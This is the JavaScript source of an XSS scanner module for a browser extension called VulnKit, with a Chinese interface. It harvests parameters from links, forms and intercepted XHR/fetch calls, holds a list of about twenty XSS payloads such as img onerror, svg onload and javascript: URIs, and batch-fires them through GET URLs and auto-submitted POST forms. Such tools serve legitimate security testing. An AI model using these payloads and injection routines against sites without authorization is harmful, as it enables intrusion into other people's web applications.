// VulnKit - XSS Scanner
window.VulnKitXss = (function () {
  'use strict';

  let xssPoints = [];
  let xssFilterType = 'all';
  let xssSearchText = '';
  let xssInterceptTimer = null;
  let xssInterceptActive = false;
  let xssInterceptCountdown = 0;

  var utils = window.VulnKitUtils.utilsProxy;

  const XSS_SCAN_PAYLOADS = [
    { name: 'alert(1)', value: '<script>alert(1)</script>' },
    { name: 'img onerror', value: '<img src=x onerror=alert(1)>' },
    { name: 'svg onload', value: '<svg onload=alert(1)>' },
    { name: 'body onload', value: '<body onload=alert(1)>' },
    { name: 'svg script', value: '<svg><script>alert(1)</script></svg>' },
    { name: 'details ontoggle', value: '<details open ontoggle=alert(1)>' },
    { name: 'img src onerror', value: '<img src=1 onerror=alert(1)>' },
    { name: 'input onfocus', value: '<input onfocus=alert(1) autofocus>' },
    { name: 'marquee onstart', value: '<marquee onstart=alert(1)>' },
    { name: 'select onchange', value: '<select onchange=alert(1)><option>1</option></select>' },
    { name: 'textarea onfocus', value: '<textarea onfocus=alert(1) autofocus>' },
    {
      name: 'keyframe anim',
      value:
        '<style>@keyframes x{}</style><div style="animation-name:x" onanimationstart="alert(1)">',
    },
    {
      name: 'math xss',
      value:
        '<math><mtext><table><mglyph><style><!--</style><img title="--><img src=1 onerror=alert(1)>',
    },
    { name: 'object data', value: '<object data="javascript:alert(1)">' },
    { name: 'embed src', value: '<embed src="javascript:alert(1)">' },
    { name: 'a href js', value: '<a href="javascript:alert(1)">click</a>' },
    { name: 'window.location', value: "<script>window.location='javascript:alert(1)'</script>" },
    { name: 'eval payload', value: "<script>eval('alert(1)')</script>" },
    { name: 'fromCharCode', value: '<script>alert(String.fromCharCode(88,83,83))</script>' },
    { name: 'constructor', value: "''.constructor.constructor('alert(1)')()" },
  ];

  async function harvestXssParamsFromDom() {
    const tab = await utils.requireTabId();
    if (!tab) return [];
    return (
      (await utils.execInTabData(
        tab.id,
        () => {
          const pageUrl = location.href;
          const collected = [];
          const seen = new Set();

          function addPoint(source, url, param, method) {
            if (!url || !param) return;
            let fullUrl;
            try {
              fullUrl = new URL(url, pageUrl).href;
            } catch {
              return;
            }
            const key = fullUrl + '|' + param + '|' + method;
            if (seen.has(key)) return;
            seen.add(key);
            collected.push({ source, url: fullUrl, param, method });
          }

          document.querySelectorAll('a[href]').forEach(a => {
            try {
              const href = new URL(a.href, pageUrl);
              if (href.origin !== location.origin) return;
              href.searchParams.forEach((_, key) => {
                addPoint('link', href.pathname + href.search, key, 'GET');
              });
            } catch {}
          });

          document.querySelectorAll('form').forEach(form => {
            const action = form.getAttribute('action') || pageUrl;
            const method = (form.getAttribute('method') || 'GET').toUpperCase();
            form.querySelectorAll('input[name], select[name], textarea[name]').forEach(el => {
              const name = el.getAttribute('name');
              if (!name) return;
              addPoint('form', action, name, method);
            });
          });

          try {
            const currentUrl = new URL(pageUrl);
            currentUrl.searchParams.forEach((_, key) => {
              addPoint('url', currentUrl.pathname + currentUrl.search, key, 'GET');
            });
          } catch {}

          return collected;
        },
        { world: 'ISOLATED' }
      )) || []
    );
  }

  async function startXssIntercept() {
    xssInterceptActive = true;
    xssInterceptCountdown = 30;
    utils.toggleBtnPair('xssscan-start-intercept-btn', 'xssscan-stop-intercept-btn', true);
    updateXssInterceptStatus();

    var tab = await utils.requireTabId();
    if (!tab) return;
    const tabId = tab.id;

    await utils.execInTab(tabId, () => {
      if (window.__XSS_INTERCEPT__) return 'already_injected';
      window.__XSS_INTERCEPT__ = [];
      window.__XSS_ORIGINAL__ = {
        xhrOpen: XMLHttpRequest.prototype.open,
        xhrSend: XMLHttpRequest.prototype.send,
        fetch: window.fetch,
      };
      function extractJsonParams(body, urlBase, method) {
        try {
          var obj = JSON.parse(body);
          if (typeof obj !== 'object' || obj === null) return;
          Object.keys(obj).forEach(function (k) {
            if (typeof obj[k] === 'object' && obj[k] !== null && !Array.isArray(obj[k])) {
              Object.keys(obj[k]).forEach(function (nk) {
                window.__XSS_INTERCEPT__.push({
                  url: urlBase,
                  param: k + '.' + nk,
                  method: method,
                });
              });
            } else {
              window.__XSS_INTERCEPT__.push({
                url: urlBase,
                param: k,
                method: method,
              });
            }
          });
        } catch (e) {}
      }

      const origOpen = window.__XSS_ORIGINAL__.xhrOpen;
      const origSend = window.__XSS_ORIGINAL__.xhrSend;
      const origFetch = window.__XSS_ORIGINAL__.fetch;

      function collectQueryParams(rawUrl, method) {
        try {
          const u = new URL(rawUrl, location.href);
          u.searchParams.forEach((_, k) => {
            window.__XSS_INTERCEPT__.push({
              url: u.origin + u.pathname + u.search,
              param: k,
              method: method,
            });
          });
        } catch {}
      }
      function collectBodyParams(body, rawUrl, method) {
        try {
          const params = new URLSearchParams(body);
          params.forEach((_, k) => {
            try {
              const u = new URL(rawUrl, location.href);
              window.__XSS_INTERCEPT__.push({
                url: u.origin + u.pathname,
                param: k,
                method: method,
              });
            } catch {}
          });
        } catch {}
      }

      XMLHttpRequest.prototype.open = function (method, url) {
        this.__xss_method = method;
        this.__xss_url = url;
        return origOpen.apply(this, arguments);
      };
      XMLHttpRequest.prototype.send = function (body) {
        if (this.__xss_url) {
          collectQueryParams(this.__xss_url, this.__xss_method || 'GET');
        }
        if (typeof body === 'string' && body) {
          collectBodyParams(body, this.__xss_url || location.href, this.__xss_method || 'POST');
          try {
            const fallbackUrl2 = this.__xss_url || location.href;
            let parsedUrl2;
            try {
              parsedUrl2 = new URL(fallbackUrl2, location.href);
            } catch {
              return;
            }
            extractJsonParams(
              body,
              parsedUrl2.origin + parsedUrl2.pathname,
              this.__xss_method || 'POST'
            );
          } catch {}
        }
        return origSend.apply(this, arguments);
      };

      window.fetch = function (input, init) {
        const url =
          typeof input === 'string' ? input : input instanceof Request ? input.url : String(input);
        collectQueryParams(url, (init?.method || 'GET').toUpperCase());
        if (init?.body && typeof init.body === 'string') {
          collectBodyParams(init.body, url, (init?.method || 'POST').toUpperCase());
          try {
            let parsedUrl;
            try {
              parsedUrl = new URL(url, location.href);
            } catch {
              return origFetch.apply(this, arguments);
            }
            extractJsonParams(
              init.body,
              parsedUrl.origin + parsedUrl.pathname,
              (init?.method || 'POST').toUpperCase()
            );
          } catch {}
        }
        return origFetch.apply(this, arguments);
      };
      return 'injected';
    });

    xssInterceptTimer = setInterval(async () => {
      xssInterceptCountdown--;
      updateXssInterceptStatus();
      if (xssInterceptCountdown <= 0) {
        stopXssIntercept();
        return;
      }
      try {
        const captured =
          (await utils.execInTabData(tabId, () => {
            const data = window.__XSS_INTERCEPT__ || [];
            window.__XSS_INTERCEPT__ = [];
            return data;
          })) || [];
        if (captured.length > 0) {
          const existing = new Set(xssPoints.map(p => p.url + '|' + p.param + '|' + p.method));
          const newPoints = captured
            .map(p => ({ ...p, source: 'ajax' }))
            .filter(p => !existing.has(p.url + '|' + p.param + '|' + p.method));
          if (newPoints.length > 0) {
            xssPoints = [...xssPoints, ...newPoints];
            renderXssPoints();
          }
        }
      } catch {}
    }, 2000);
  }

  async function stopXssIntercept() {
    if (xssInterceptTimer) {
      clearInterval(xssInterceptTimer);
      xssInterceptTimer = null;
    }
    xssInterceptActive = false;
    utils.toggleBtnPair('xssscan-start-intercept-btn', 'xssscan-stop-intercept-btn', false);
    updateXssInterceptStatus();

    var tab = await utils.requireTabId();
    if (!tab) return;
    utils
      .execInTab(tab.id, () => {
        if (!window.__XSS_ORIGINAL__) return;
        if (window.__XSS_ORIGINAL__.xhrOpen) {
          XMLHttpRequest.prototype.open = window.__XSS_ORIGINAL__.xhrOpen;
        }
        if (window.__XSS_ORIGINAL__.xhrSend) {
          XMLHttpRequest.prototype.send = window.__XSS_ORIGINAL__.xhrSend;
        }
        if (window.__XSS_ORIGINAL__.fetch) {
          window.fetch = window.__XSS_ORIGINAL__.fetch;
        }
        delete window.__XSS_INTERCEPT__;
        delete window.__XSS_ORIGINAL__;
      })
      .catch(() => {});
  }

  function updateXssInterceptStatus() {
    const el = utils.get('xssscan-status');
    if (!el) return;
    if (xssInterceptActive) {
      el.textContent =
        '拦截监听中... 剩余 ' +
        xssInterceptCountdown +
        's — 已捕获 ' +
        xssPoints.length +
        ' 个参数点';
      el.style.color = '#e67e22';
    } else {
      el.textContent =
        xssPoints.length > 0
          ? '监听结束，共 ' + xssPoints.length + ' 个参数点'
          : '点击「采集参数」开始扫描当前页面';
      el.style.color = '';
    }
  }

  function getFilteredXssPoints() {
    var list = xssPoints;
    if (xssFilterType !== 'all') {
      list = list.filter(function (p) {
        return p.source === xssFilterType;
      });
    }
    if (xssSearchText) {
      var lower = xssSearchText.toLowerCase();
      list = list.filter(function (p) {
        return (
          (p.url && p.url.toLowerCase().indexOf(lower) !== -1) ||
          (p.param && p.param.toLowerCase().indexOf(lower) !== -1) ||
          (p.source && p.source.toLowerCase().indexOf(lower) !== -1)
        );
      });
    }
    return list;
  }

  function renderXssPoints() {
    const container = utils.get('xssscan-results');
    const countEl = utils.get('xssscan-count');
    if (!container) return;
    const filtered = getFilteredXssPoints();
    if (countEl) {
      var hasFilter = xssFilterType !== 'all' || xssSearchText;
      countEl.textContent =
        '共发现 ' +
        xssPoints.length +
        ' 个注入点' +
        (hasFilter ? '（显示: ' + filtered.length + '）' : '');
    }
    if (filtered.length === 0) {
      utils.setEmpty('xssscan-results', '暂无注入点');
      return;
    }
    const sourceLabels = { link: '链接', form: '表单', url: 'URL', ajax: 'AJAX' };
    const sourceColors = { link: '#4A90E2', form: '#e67e22', url: '#27ae60', ajax: '#e74c3c' };
    let html =
      '<table class="xssscan-table"><thead><tr><th><input type="checkbox" id="xssscan-check-all" checked></th><th>来源</th><th>URL</th><th>参数</th><th>方法</th></tr></thead><tbody>';
    filtered.forEach((p, i) => {
      const shortUrl = p.url.length > 40 ? p.url.substring(0, 37) + '...' : p.url;
      html +=
        '<tr>' +
        '<td><input type="checkbox" class="xssscan-point-check" data-idx="' +
        i +
        '" checked></td>' +
        '<td><span class="xssscan-source-tag" style="background:' +
        (sourceColors[p.source] || '#999') +
        '">' +
        (sourceLabels[p.source] || p.source) +
        '</span></td>' +
        '<td class="xssscan-url-cell" title="' +
        utils.escapeHtml(p.url) +
        '">' +
        utils.escapeHtml(shortUrl) +
        '</td>' +
        '<td class="xssscan-param-cell">' +
        utils.escapeHtml(p.param) +
        '</td>' +
        '<td>' +
        utils.escapeHtml(p.method) +
        '</td>' +
        '</tr>';
    });
    html += '</tbody></table>';
    container.innerHTML = html;

    const checkAll = container.querySelector('#xssscan-check-all');
    if (checkAll) {
      checkAll.addEventListener('change', () => {
        container.querySelectorAll('.xssscan-point-check').forEach(cb => {
          cb.checked = checkAll.checked;
        });
      });
    }
  }

  function getSelectedXssPoints() {
    const filtered = getFilteredXssPoints();
    const checks = document.querySelectorAll('.xssscan-point-check');
    return filtered.filter((_, i) => {
      const cb = checks[i];
      return cb && cb.checked;
    });
  }

  function encodePayload(payload, encoding) {
    switch (encoding) {
      case 'url':
        return encodeURIComponent(payload);
      case 'html':
        return payload
          .replace(/&/g, '&amp;')
          .replace(/</g, '&lt;')
          .replace(/>/g, '&gt;')
          .replace(/"/g, '&quot;')
          .replace(/'/g, '&#39;');
      case 'base64':
        return btoa(unescape(encodeURIComponent(payload)));
      default:
        return payload;
    }
  }

  function buildXssTestUrl(point, payload) {
    try {
      const url = new URL(point.url);
      if (point.method === 'GET') {
        url.searchParams.set(point.param, payload);
        return url.href;
      }
      if (point.method === 'POST') {
        url.searchParams.set(point.param, payload);
        return { url: url.href, method: 'POST', param: point.param, payload: payload };
      }
      return url.href;
    } catch {
      return null;
    }
  }

  function getSelectedPayload() {
    const selectEl = utils.get('xssscan-payload-select');
    const customEl = utils.get('xssscan-custom-payload');
    if (customEl && customEl.value.trim()) return customEl.value.trim();
    if (selectEl && selectEl.value) return selectEl.value;
    return XSS_SCAN_PAYLOADS[0].value;
  }

  async function handleXssHarvest() {
    const statusEl = utils.get('xssscan-status');
    if (statusEl) {
      statusEl.textContent = '正在采集页面参数...';
      statusEl.style.color = '#4A90E2';
    }
    try {
      const domPoints = await harvestXssParamsFromDom();
      const existing = new Set(xssPoints.map(p => p.url + '|' + p.param + '|' + p.method));
      const newPoints = domPoints.filter(
        p => !existing.has(p.url + '|' + p.param + '|' + p.method)
      );
      xssPoints = [...xssPoints, ...newPoints];
      renderXssPoints();
      if (statusEl) {
        statusEl.textContent =
          '采集完成，新增 ' + newPoints.length + ' 个注入点，共 ' + xssPoints.length + ' 个';
        statusEl.style.color = '#27ae60';
      }
      if (newPoints.length > 0)
        utils.showToast('发现 ' + newPoints.length + ' 个注入点', 'success');
      else utils.showToast('未发现新的注入点', 'info');
    } catch (e) {
      if (statusEl) {
        statusEl.textContent = '采集失败: ' + e.message;
        statusEl.style.color = '#e74c3c';
      }
      utils.showToast('采集失败', 'error');
    }
  }

  async function handleBatchOpenXss() {
    const selected = getSelectedXssPoints();
    if (selected.length === 0) {
      utils.showToast('没有选中的注入点', 'warning');
      return;
    }
    const rawPayload = getSelectedPayload();
    const encoding = (utils.get('xssscan-encoding') || {}).value || 'none';
    const payload = encodePayload(rawPayload, encoding);
    const getPoints = selected.filter(p => p.method !== 'POST');
    const postPoints = selected.filter(p => p.method === 'POST');
    let opened = 0;

    for (const point of getPoints) {
      const result = buildXssTestUrl(point, payload);
      if (!result || typeof result === 'object') continue;
      chrome.tabs.create({ url: result, active: false });
      opened++;
    }

    if (postPoints.length > 0) {
      const tab = await utils.requireTabId();
      if (!tab) {
        utils.showToast('无法获取当前标签页', 'error');
        return;
      }
      for (const point of postPoints) {
        const targetUrl = point.url;
        try {
          await utils.execInTab(
            tab.id,
            (url, param, pl) => {
              const form = document.createElement('form');
              form.method = 'POST';
              form.action = url;
              form.target = '_blank';
              form.style.display = 'none';
              const input = document.createElement('input');
              input.type = 'hidden';
              input.name = param;
              input.value = pl;
              form.appendChild(input);
              document.body.appendChild(form);
              form.submit();
              form.remove();
            },
            { world: 'ISOLATED', args: [targetUrl, point.param, payload] }
          );
          opened++;
        } catch {
          try {
            const escAttr = s =>
              s
                .replace(/&/g, '&amp;')
                .replace(/"/g, '&quot;')
                .replace(/</g, '&lt;')
                .replace(/>/g, '&gt;');
            const formHtml =
              '<form method="POST" action="' +
              escAttr(targetUrl) +
              '">' +
              '<input type="hidden" name="' +
              escAttr(point.param) +
              '" value="' +
              escAttr(payload) +
              '">' +
              '</form><script>document.forms[0].submit()<\/script>';
            const blobUrl = URL.createObjectURL(new Blob([formHtml], { type: 'text/html' }));
            chrome.tabs.create({ url: blobUrl, active: false });
            opened++;
          } catch {
            /* skip this point */
          }
        }
      }
    }

    const methodInfo = postPoints.length > 0 ? '（POST 通过页面内表单提交）' : '';
    utils.showToast('已打开 ' + opened + ' 个测试页面' + methodInfo, 'success');
  }

  function handleCopyXssUrls() {
    const selected = getSelectedXssPoints();
    if (selected.length === 0) {
      utils.showToast('没有选中的注入点', 'warning');
      return;
    }
    const rawPayload = getSelectedPayload();
    const encoding = (utils.get('xssscan-encoding') || {}).value || 'none';
    const payload = encodePayload(rawPayload, encoding);
    const lines = selected
      .map(p => {
        const result = buildXssTestUrl(p, payload);
        if (!result) return null;
        if (typeof result === 'object') {
          return '[POST] ' + result.url + '\n  参数: ' + result.param + '=' + result.payload;
        }
        return result;
      })
      .filter(Boolean);
    if (lines.length === 0) {
      utils.showToast('无法生成测试URL', 'warning');
      return;
    }
    utils.copyText(lines.join('\n'));
    utils.showToast('已复制 ' + lines.length + ' 个URL', 'success');
  }

  function initXssScanPayloadSelect() {
    const select = utils.get('xssscan-payload-select');
    if (!select) return;
    XSS_SCAN_PAYLOADS.forEach(p => {
      const opt = document.createElement('option');
      opt.value = p.value;
      opt.textContent = p.name;
      select.appendChild(opt);
    });
    var xssData = window.VulnKitPayload ? window.VulnKitPayload.XSS_DATA : null;
    if (xssData) {
      Object.keys(xssData).forEach(cat => {
        const group = document.createElement('optgroup');
        group.label = cat;
        xssData[cat].forEach(payload => {
          const opt = document.createElement('option');
          opt.value = payload;
          opt.textContent = payload.length > 50 ? payload.substring(0, 47) + '...' : payload;
          group.appendChild(opt);
        });
        select.appendChild(group);
      });
    }
  }

  function clearResults() {
    xssPoints = [];
    renderXssPoints();
    updateXssInterceptStatus();
  }

  function exportData() {
    if (xssPoints.length === 0) {
      utils.showToast('没有可导出的注入点', 'warning');
      return;
    }
    var rows = xssPoints.map(function (p) {
      return [p.source, p.url, p.param, p.method];
    });
    utils.buildCsv(
      ['Source', 'URL', 'Param', 'Method'],
      rows,
      'vulnkit-xss-' + Date.now() + '.csv'
    );
  }

  return {
    startXssIntercept,
    stopXssIntercept,
    updateXssInterceptStatus,
    renderXssPoints,
    handleXssHarvest,
    handleBatchOpenXss,
    handleCopyXssUrls,
    initXssScanPayloadSelect,
    clearResults,
    exportData,
    get xssPoints() {
      return xssPoints;
    },
    set xssPoints(v) {
      xssPoints = v;
    },
    get xssFilterType() {
      return xssFilterType;
    },
    set xssFilterType(v) {
      xssFilterType = v;
    },
    setXssSearchText: function (text) {
      xssSearchText = (text || '').trim();
      renderXssPoints();
    },
  };
})();
